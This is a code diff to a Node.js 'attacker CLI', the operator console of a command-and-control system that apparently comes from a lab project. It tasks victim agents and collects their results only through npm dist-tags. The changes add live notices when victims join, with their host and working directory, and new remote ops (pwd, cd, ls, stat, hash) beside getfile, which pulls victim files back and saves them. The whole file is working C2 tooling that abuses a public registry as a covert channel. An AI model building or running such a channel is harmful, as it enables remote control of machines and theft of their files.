@@ -1,14 +1,19 @@
 // Attacker CLI: interactive REPL that issues commands and collects results
 // exclusively through npm dist-tags. It never talks to a victim directly.
 //
+// While the prompt is idle, a background poller keeps running and prints
+// live notifications: agents joining (announce tags) and tasks completing
+// or failing (result tags).
+//
 // Commands:
-//   agents                      list agent ids seen in result tags / state
+//   agents                      list agents seen, with last-seen info
 //   task <agentId|all> <op> [args...]   publish a command tag
-//                         (ops: echo, sysinfo, ping, time, whoami, getfile)
+//                         (ops: echo, sysinfo, ping, time, whoami,
+//                          getfile, pwd, cd, ls, stat, hash)
+//   history [n]                 show the last n requests/responses (default 20)
 //   poll                        one-shot fetch & decode of new result tags
-//   watch [intervalSec]         continuously poll until Ctrl-C
-//   clean                       delete all lab tags (x-cmd-*/x-res-*) from the registry
-//   stats                       local counters: commands sent, results received, per-agent
+//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
+//   stats                       local counters: commands sent, results received
 //   help                        show help
 //   exit                        save state and quit
 
@@ -21,8 +26,11 @@ import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
   TASK_OPS,
+  MAX_TAG_LEN,
+  decodeAnnounceTag,
   decodeResultTag,
   encodeCommandTag,
+  isAnnounceTag,
   isLabTag,
   isResultTag,
   reassembleResult,
@@ -32,6 +40,15 @@ import { saveState } from '../victim/agent.js';
 
 const tty = process.stdout.isTTY;
 const c = (color, s) => (tty ? styleText(color, s) : s);
+
+const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
+const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
+const PATH_ARG_OPS = new Set(['getfile', 'cd', 'stat', 'hash']); // path required
+const OPS_WITH_ARGS = new Set([...PATH_ARG_OPS, 'ls', 'echo']); // ls path optional
+
+function ts() {
+  return new Date().toTimeString().slice(0, 8);
+}
 
 // ---------------------------------------------------------------------------
 // attacker state (separate shape from victim state, same persistence helpers)
@@ -45,6 +62,8 @@ function defaultAttackerState() {
     perAgent: {}, // agentId -> results received
     seenResults: [], // "<agentId>:<seq>" strings
     agents: [], // agent ids observed
+    agentInfo: {}, // agentId -> { ts, host, cwd, lastSeen }
+    history: [], // [{ dir: 'out'|'in', ts, ... }]
   };
 }
 
@@ -63,6 +82,13 @@ function loadAttackerState(path) {
   return s;
 }
 
+function pushHistory(state, entry) {
+  state.history.push(entry);
+  if (state.history.length > HISTORY_MAX) {
+    state.history.splice(0, state.history.length - HISTORY_MAX);
+  }
+}
+
 // ---------------------------------------------------------------------------
 
 function parseTaskLine(line) {
@@ -74,11 +100,21 @@ function parseTaskLine(line) {
   if (!TASK_OPS.includes(op)) {
     throw new Error(`unknown op "${op}" — allowed: ${TASK_OPS.join(', ')}`);
   }
+  if (!OPS_WITH_ARGS.has(op) && rest.length > 0) {
+    throw new Error(`op "${op}" takes no arguments`);
+  }
   const args = {};
   if (op === 'echo') args.text = rest.join(' ');
-  if (op === 'getfile') {
-    args.path = rest.join(' ');
-    if (!args.path) throw new Error('usage: task <agentId|all> getfile <path>');
+  if (PATH_ARG_OPS.has(op) || op === 'ls') {
+    const p = rest.join(' ');
+    if (p) args.path = p;
+    if (PATH_ARG_OPS.has(op) && !args.path) {
+      throw new Error(
+        `usage: task <agentId|all> ${op} <path>\n` +
+          '  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd ' +
+          '(see the pwd/cd ops)',
+      );
+    }
   }
   return { target, op, args };
 }
@@ -106,22 +142,15 @@ function saveDownload(agentId, r) {
   return out;
 }
 
-function printResult(agentId, r) {
-  const head = c('magenta', `${agentId} seq=${r.seq} op=${r.op ?? '?'}`);
-  if (!r.ok) {
-    console.log(`${head} ${c('red', 'error')}: ${r.error}`);
-    return;
+function formatHistoryEntry(e) {
+  const at = new Date(e.ts).toTimeString().slice(0, 8);
+  if (e.dir === 'out') {
+    const argStr = e.args && Object.keys(e.args).length > 0 ? ` ${JSON.stringify(e.args)}` : '';
+    return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
   }
-  if (r.file && typeof r.file.dataB64 === 'string') {
-    try {
-      const out = saveDownload(agentId, r);
-      console.log(`${head} ${c('green', 'ok')}: ${r.output} -> saved to ${c('bold', out)}`);
-    } catch (err) {
-      console.log(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`);
-    }
-    return;
-  }
-  console.log(`${head} ${c('green', 'ok')}: ${r.output}`);
+  const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
+  const body = e.ok ? (e.output ?? '') : (e.error ?? '');
+  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${e.op} ${status}: ${body}`;
 }
 
 async function main() {
@@ -147,64 +176,158 @@ async function main() {
   if (!cfg.token) {
     console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
   }
+  console.log(`state=${statePath} (history: ${state.history.length} entries)`);
   console.log('type "help" for commands');
+
+  // --- REPL (created before the poller so notifications can redraw the prompt)
+
+  const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+    prompt: c('blue', 'npm-c2> '),
+  });
+
+  /** Print a live notification without eating the line the user is typing. */
+  function notify(line) {
+    console.log(line);
+    rl.prompt(true);
+  }
 
   // --- shared helpers -------------------------------------------------------
 
+  function noteAgent(agentId, info = {}) {
+    const isNew = !state.agents.includes(agentId);
+    if (isNew) state.agents.push(agentId);
+    const prev = state.agentInfo[agentId] ?? {};
+    state.agentInfo[agentId] = {
+      ...prev,
+      ...info,
+      lastSeen: Date.now(),
+    };
+    if (isNew) {
+      const { host, cwd } = state.agentInfo[agentId];
+      const detail = [host && `host=${host}`, cwd && `cwd=${cwd}`].filter(Boolean).join(' ');
+      notify(`[${ts()}] ${c('green', '[+] agent joined:')} ${c('bold', agentId)}${detail ? ` (${detail})` : ''}`);
+    }
+  }
+
+  function printResult(agentId, r) {
+    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${r.op ?? '?'}`;
+    if (!r.ok) {
+      notify(`${head} ${c('red', 'FAILED')}: ${r.error}`);
+      return;
+    }
+    if (r.file && typeof r.file.dataB64 === 'string') {
+      try {
+        const out = saveDownload(agentId, r);
+        notify(`${head} ${c('green', 'done')}: ${r.output} -> saved to ${c('bold', out)}`);
+      } catch (err) {
+        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`);
+      }
+      return;
+    }
+    notify(`${head} ${c('green', 'done')}: ${r.output}`);
+  }
+
+  function recordResult(agentId, r) {
+    pushHistory(state, {
+      dir: 'in',
+      ts: Date.now(),
+      agentId,
+      seq: r.seq,
+      op: r.op ?? '?',
+      ok: r.ok,
+      output:
+        typeof r.output === 'string' && r.output.length > HISTORY_OUTPUT_MAX
+          ? `${r.output.slice(0, HISTORY_OUTPUT_MAX)}...`
+          : r.output,
+      error: r.error,
+    });
+  }
+
+  let pollInFlight = false;
+
   async function pollOnce({ quiet = false } = {}) {
-    const tags = await client.getDistTags();
-    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
-    for (const name of Object.keys(tags)) {
-      if (!isResultTag(name)) continue;
-      let part;
-      try {
-        part = decodeResultTag(name);
-      } catch (err) {
-        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
-        continue;
+    if (pollInFlight) return 0; // background tick overlapping a manual poll
+    pollInFlight = true;
+    try {
+      const tags = await client.getDistTags();
+      const groups = new Map(); // "<agentId>:<seq>" -> parts[]
+      for (const name of Object.keys(tags)) {
+        if (isAnnounceTag(name)) {
+          try {
+            const ann = decodeAnnounceTag(name);
+            noteAgent(ann.agentId, {
+              ts: ann.payload.ts,
+              host: ann.payload.host,
+              cwd: ann.payload.cwd,
+            });
+          } catch (err) {
+            logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
+          }
+          continue;
+        }
+        if (!isResultTag(name)) continue;
+        let part;
+        try {
+          part = decodeResultTag(name);
+        } catch (err) {
+          logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
+          continue;
+        }
+        const key = `${part.agentId}:${part.seq}`;
+        if (!groups.has(key)) groups.set(key, []);
+        groups.get(key).push(part);
+        noteAgent(part.agentId);
       }
-      const key = `${part.agentId}:${part.seq}`;
-      if (!groups.has(key)) groups.set(key, []);
-      groups.get(key).push(part);
-      if (!state.agents.includes(part.agentId)) state.agents.push(part.agentId);
+      let fresh = 0;
+      for (const [key, parts] of groups) {
+        if (state.seenResults.includes(key)) continue;
+        const total = parts[0].total;
+        if (new Set(parts.map((p) => p.chunk)).size !== total) {
+          if (!quiet) notify(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`));
+          continue;
+        }
+        try {
+          const result = reassembleResult(parts);
+          const a = parts[0].agentId;
+          printResult(a, result);
+          recordResult(a, result);
+          state.seenResults.push(key);
+          state.received++;
+          state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
+          fresh++;
+        } catch (err) {
+          logger.warn(`failed to reassemble ${key}: ${err.message}`);
+        }
+      }
+      save();
+      if (!quiet) {
+        notify(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
+      }
+      return fresh;
+    } finally {
+      pollInFlight = false;
     }
-    let fresh = 0;
-    for (const [key, parts] of groups) {
-      if (state.seenResults.includes(key)) continue;
-      const total = parts[0].total;
-      if (new Set(parts.map((p) => p.chunk)).size !== total) {
-        if (!quiet) console.log(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`));
-        continue;
-      }
-      try {
-        const result = reassembleResult(parts);
-        printResult(parts[0].agentId, result);
-        state.seenResults.push(key);
-        state.received++;
-        const a = parts[0].agentId;
-        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
-        fresh++;
-      } catch (err) {
-        logger.warn(`failed to reassemble ${key}: ${err.message}`);
-      }
-    }
-    save();
-    if (!quiet && fresh === 0) console.log('no new results');
-    return fresh;
   }
 
   const commands = {
     help() {
       console.log(
         [
-          `${c('bold', 'agents')}                          list agent ids seen so far`,
-          `${c('bold', 'task')} <agentId|all> <op> [args]  send a task (ops: ${TASK_OPS.join(', ')})`,
+          `${c('bold', 'agents')}                          list agents seen (last-seen, host, cwd)`,
+          `${c('bold', 'task')} <agentId|all> <op> [args]  send a task`,
+          `  ops without args:            echo <text>, sysinfo, ping, time, whoami, pwd`,
+          `  ops with a path:             getfile, cd, stat, hash  (absolute or cwd-relative)`,
+          `  ls [path]                    list a directory (default: agent cwd)`,
+          `${c('bold', 'history')} [n]                      last n requests/responses (default 20)`,
           `${c('bold', 'poll')}                            fetch & decode new result tags once`,
-          `${c('bold', 'watch')} [intervalSec]             poll continuously until Ctrl-C`,
-          `${c('bold', 'clean')}                           delete all x-cmd-*/x-res-* tags`,
+          `${c('bold', 'clean')}                           delete all x-cmd-*/x-res-*/x-ann-* tags`,
           `${c('bold', 'stats')}                           show local counters`,
           `${c('bold', 'help')}                            this help`,
           `${c('bold', 'exit')}                            save state and quit`,
+          '',
+          'live notifications (agent joined, task done/failed) print automatically',
         ].join('\n'),
       );
     },
@@ -218,7 +341,16 @@ async function main() {
       if (state.agents.length === 0) {
         console.log('no agents seen yet');
       } else {
-        for (const a of state.agents) console.log(`- ${c('green', a)} (${state.perAgent[a] ?? 0} results)`);
+        for (const a of state.agents) {
+          const info = state.agentInfo[a] ?? {};
+          const seen = info.lastSeen ? new Date(info.lastSeen).toLocaleString() : '?';
+          const detail = [info.host && `host=${info.host}`, info.cwd && `cwd=${info.cwd}`]
+            .filter(Boolean)
+            .join(' ');
+          console.log(
+            `- ${c('green', a)} (${state.perAgent[a] ?? 0} results, last seen ${seen})${detail ? `\n    ${detail}` : ''}`,
+          );
+        }
       }
     },
 
@@ -230,40 +362,33 @@ async function main() {
       await client.setDistTag(tag, PINNED_VERSION);
       state.nextSeq[target] = seq;
       state.sent++;
+      pushHistory(state, { dir: 'out', ts: Date.now(), target, seq, op, args });
       save();
-      console.log(`${c('green', 'sent')} ${target}#${seq} ${op} (${tag.length} chars)`);
+      console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
+      console.log(c('dim', `  ${tag}`));
+      if (state.agents.length > 0 && target !== 'all' && !state.agents.includes(target)) {
+        console.log(c('yellow', `  note: agent "${target}" has not been seen yet`));
+      }
     },
 
     async poll() {
       await pollOnce();
     },
 
-    async watch(line) {
+    history(line) {
       const arg = line.trim().split(/\s+/)[1];
-      const intervalSec = arg ? Number(arg) : Math.min(cfg.pollIntervalSec, 5);
-      if (!Number.isFinite(intervalSec) || intervalSec <= 0) {
-        console.log('usage: watch [intervalSec]');
+      const n = arg ? Number(arg) : 20;
+      if (!Number.isSafeInteger(n) || n <= 0) {
+        console.log('usage: history [n]');
         return;
       }
-      console.log(`watching every ${intervalSec}s — Ctrl-C to stop`);
-      let stop = false;
-      const onSigint = () => {
-        stop = true;
-      };
-      process.on('SIGINT', onSigint);
-      try {
-        while (!stop) {
-          try {
-            await pollOnce({ quiet: true });
-          } catch (err) {
-            console.log(c('yellow', `poll failed: ${err.message}`));
-          }
-          await new Promise((r) => setTimeout(r, intervalSec * 1000));
-        }
-      } finally {
-        process.removeListener('SIGINT', onSigint);
+      const entries = state.history.slice(-n);
+      if (entries.length === 0) {
+        console.log('history is empty');
+        return;
       }
-      console.log('watch stopped');
+      console.log(`last ${entries.length} of ${state.history.length} entries:`);
+      for (const e of entries) console.log(formatHistoryEntry(e));
     },
 
     async clean() {
@@ -293,17 +418,28 @@ async function main() {
       for (const [a, n] of Object.entries(state.perAgent)) {
         console.log(`  ${a}: ${n} results`);
       }
+      console.log(`history entries:  ${state.history.length}`);
       console.log(`next seq:         ${JSON.stringify(state.nextSeq)}`);
     },
   };
 
-  // --- REPL -----------------------------------------------------------------
+  // --- background poller: live notifications while the prompt is idle -------
 
-  const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout,
-    prompt: c('blue', 'npm-c2> '),
-  });
+  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
+  let rlClosed = false;
+  const timer = setInterval(async () => {
+    if (rlClosed) return;
+    try {
+      await pollOnce({ quiet: true });
+    } catch (err) {
+      notify(c('yellow', `[${ts()}] background poll failed: ${err.message}`));
+    }
+  }, notifyIntervalSec * 1000);
+  timer.unref?.();
+  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));
+
+  // --- REPL loop ------------------------------------------------------------
+
   rl.prompt();
 
   async function handleLine(line) {
@@ -316,6 +452,8 @@ async function main() {
         save();
         rl.close();
         return;
+      } else if (cmd === 'watch') {
+        console.log('watch is gone — live notifications already poll in the background');
       } else if (commands[cmd]) {
         await commands[cmd](trimmed);
       } else {
@@ -337,6 +475,8 @@ async function main() {
 
   rl.on('close', () => {
     queue.then(() => {
+      rlClosed = true;
+      clearInterval(timer);
       save();
       logger.close();
       console.log('bye');
